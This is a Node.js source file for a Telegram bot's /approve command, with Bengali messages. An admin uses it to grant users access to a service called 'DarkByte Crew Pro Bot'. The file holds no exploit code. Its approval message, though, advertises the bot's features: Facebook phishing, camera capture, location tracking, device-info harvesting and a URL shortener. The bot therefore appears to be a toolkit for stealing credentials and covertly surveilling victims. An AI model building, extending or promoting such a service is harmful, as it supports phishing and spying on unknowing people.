const adminCheck = require('../middlewares/adminCheck');
const User = require('../models/User');
const helpers = require('../utils/helpers');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text;
  
  try {
    const isAdmin = await adminCheck(userId);
    if (!isAdmin) {
      return bot.sendMessage(chatId, '⛔ আপনি অ্যাডমিন নন।');
    }
    
    const parts = text.split(' ');
    if (parts.length < 2) {
      return bot.sendMessage(chatId, '📝 /approve [user_id]');
    }
    
    let targetId = parts[1];
    
    if (targetId.startsWith('@')) {
      const user = await User.findOne({ username: targetId.substring(1) });
      if (!user) return bot.sendMessage(chatId, '❌ ইউজার নেই');
      targetId = user.userId;
    } else {
      targetId = parseInt(targetId);
    }
    
    const targetUser = await User.findOne({ userId: targetId });
    if (!targetUser) {
      return bot.sendMessage(chatId, '❌ ইউজার নেই');
    }
    
    targetUser.approved = true;
    await targetUser.save();
    
    // ইউজারকে নোটিফিকেশন
    await bot.sendMessage(targetId,
      `🎉 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃!\n\n` +
      `অভিনন্দন ${targetUser.firstName}! 🥳\n\n` +
      `আপনাকে DarkByte Crew Pro Bot ব্যবহারের অনুমতি দেওয়া হয়েছে।\n\n` +
      `✅ এখন আপনি সব কমান্ড ব্যবহার করতে পারবেন:\n` +
      `• /fbphishing - ফেসবুক ফিশিং\n` +
      `• /camera - ক্যামেরা ক্যাপচার\n` +
      `• /location - লোকেশন ট্র্যাকার\n` +
      `• /info - ডিভাইস ইনফো\n` +
      `• /all - অল-ইন-ওয়ান\n` +
      `• /shorten - ইউআরএল শর্টনার\n\n` +
      `📌 শুরু করতে /help টাইপ করুন।\n\n` +
      `⚠️ দয়া করে নিয়ম মেনে ব্যবহার করুন।\n` +
      `⛔ অপব্যবহার করলে ব্যান করা হবে।`
    );
    
    await bot.sendMessage(chatId, `✅ ${targetUser.firstName} অ্যাপ্রুভড করা হয়েছে।`);
    
  } catch (error) {
    console.error('Approve Error:', error);
  }
};